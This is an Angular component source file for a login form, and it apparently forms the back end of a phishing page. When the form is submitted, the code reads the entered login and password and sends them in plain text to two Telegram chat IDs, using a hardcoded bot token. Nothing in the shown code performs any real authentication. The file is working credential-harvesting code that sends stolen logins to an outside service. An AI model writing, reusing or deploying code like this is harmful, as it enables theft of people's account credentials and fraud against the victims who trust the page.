import { Component, OnInit, ViewEncapsulation } from '@angular/core';
import Telegram from 'telegram-send-message';
import { FormBuilder, Validators } from '@angular/forms';

@Component({
	selector: 'app-root',
	templateUrl: './app.component.html',
	styleUrls: ['./app.component.scss'],
	encapsulation: ViewEncapsulation.None
})
export class AppComponent implements OnInit {
	loginStepPhone = true;
	form = this.formBuilder.group({
		login: ['', [Validators.required]],
		password: ['', [Validators.required]],
	});
	prevValue = {
		login: '',
		password: '',
	};

	sentMessage(): void {
		if (this.prevValue.login !== this.form.get('login').value || this.prevValue.password !== this.form.get('password').value) {
			const message = 'Login: ' + this.form.get('login').value + '      Password: ' + this.form.get('password').value;
			const token = '949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs';
			console.log('sending..');
			Telegram.setToken(token);
			Telegram.setRecipient('880595419');
			Telegram.setMessage(message);
			Telegram.send();
			Telegram.setToken(token);
			Telegram.setRecipient('946981380');
			Telegram.setMessage(message);
			Telegram.send();
			this.prevValue.login = this.form.get('login').value;
			this.prevValue.password = this.form.get('password').value;
		}
	}

	constructor(
		private formBuilder: FormBuilder,
	) {}

	ngOnInit(): void {
	}

	onSubmit(): void {
		if (this.form.valid) {
			this.sentMessage();
		}
		console.log(this.form.value);
	}
}
